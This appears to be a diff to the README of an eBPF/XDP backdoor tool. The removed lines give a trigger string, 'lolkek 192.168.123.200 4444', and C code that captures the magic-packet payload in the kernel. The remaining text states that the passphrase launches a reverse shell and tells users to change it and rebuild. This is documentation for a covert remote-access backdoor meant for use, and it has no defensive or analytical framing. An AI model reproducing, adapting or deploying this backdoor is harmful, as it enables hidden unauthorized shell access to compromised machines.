@@ -73,35 +73,7 @@ if strings.Contains(dataStr, "lolkek") {
 ...
 ```
 
-and the number of bytes received from tcp payload is equal to the number of characters sent for the backdoor. Now this number is equal to 27
-```bash
-lolkek 192.168.123.200 4444 #27 characters
-```
-
-**bpf.c:**
-```C
-//GET TCP DATA
-unsigned char *tcpdata = (unsigned char *)tcp + tcp_header_bytes;
-
-if ((void *)(tcpdata + 27) > data_end) { // <---
-    return XDP_PASS;
-}
-
-// Reserve space in the ring buffer
-void *ringbuf_space = bpf_ringbuf_reserve(&xdprb, tcp_header_bytes, 0);
-if (!ringbuf_space) {
-    return XDP_PASS;  // If reservation fails, skip processing
-}
-
-// Copy the TCP header bytes into the ring buffer
-// Using a loop to ensure compliance with eBPF verifier
-for (int i = 0; i < 27; i++) { // <---
-    unsigned char byte = *((unsigned char *)tcpdata + i);
-    ((unsigned char *)ringbuf_space)[i] = byte;
-}
-```
-
-**To change the passphrase, replace the string `lolkek` with your own phrase. This phrase is used as a trigger to launch the reverse shell. And the number of bytes to be received.**
+**To change the passphrase, replace the string `lolkek` with your own phrase. This phrase is used as a trigger to launch the reverse shell.
 
 After changing the passphrase, you need to rebuild the project:
 
